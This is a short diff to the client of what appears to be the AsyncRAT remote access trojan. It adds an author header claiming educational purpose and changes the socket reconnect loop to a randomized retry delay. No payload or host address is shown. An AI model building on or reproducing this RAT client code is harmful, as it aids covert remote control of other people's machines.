@@ -2,11 +2,19 @@
 using Microsoft.VisualBasic;
 using Microsoft.VisualBasic.Devices;
 using System;
-using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
+
+
+//       │ Author     : NYAN CAT
+//       │ Name       : AsyncRAT // Simple Socket
+
+//       Contact Me   : https://github.com/NYAN-x-CAT
+
+//       This program Is distributed for educational purposes only.
+
 
 namespace Client
 {
@@ -24,7 +32,7 @@ namespace Client
             InitializeClient();
             while (true)
             {
-                Thread.Sleep(1500);
+                Thread.Sleep(1000);
             }
         }
 
@@ -51,7 +59,12 @@ namespace Client
             catch
             {
                 Console.WriteLine("Disconnected!");
-                Thread.Sleep(2500);
+                Thread.Sleep(new Random().Next(5000));
+                try
+                {
+                    client.Dispose();
+                }
+                catch { }
                 InitializeClient();
             }
         }
